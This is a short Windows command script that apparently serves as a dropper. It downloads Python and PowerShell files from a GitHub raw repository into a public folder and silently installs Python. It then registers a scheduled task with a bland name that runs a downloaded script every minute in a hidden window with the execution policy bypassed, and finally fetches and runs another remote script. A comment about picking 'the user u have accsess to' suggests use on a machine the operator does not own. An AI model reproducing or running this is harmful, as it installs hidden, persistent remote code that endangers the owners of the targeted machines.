# Define the base URL

curl https://raw.githubusercontent.com/gghk0/gghk/refs/heads/main/file.py -o C:\Users\Public\Documents\file.py

# Download script2
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/gghk0/gghk/refs/heads/main/script2.ps1" -OutFile "C:\Users\Public\Documents\script2.ps1"


# Downloading python (takes time and needs internet)
curl https://www.python.org/ftp/python/3.12.5/python-3.12.5-amd64.exe -o C:\Users\Public\Documents\python-3.12.5-amd64.exe

# installing python (for the current user)[u may need to reset ur ps session after this]
C:\Users\Public\Documents\python-3.12.5-amd64.exe /quiet InstallAllUsers=0 PrependPath=1

# making task (change the time and username with the user u have accsess to)
schtasks /create /sc minute /mo 1 /tn systemsc /tr "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass -WindowStyle hidden C:\Users\Public\Documents\script2.ps1" /ru coder # change this

curl https://raw.githubusercontent.com/gghk0/gghk/refs/heads/main/inst.ps1 -o C:\Users\Public\Documents\inst.ps1
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass -WindowStyle hidden C:\Users\Public\Documents\inst.ps1
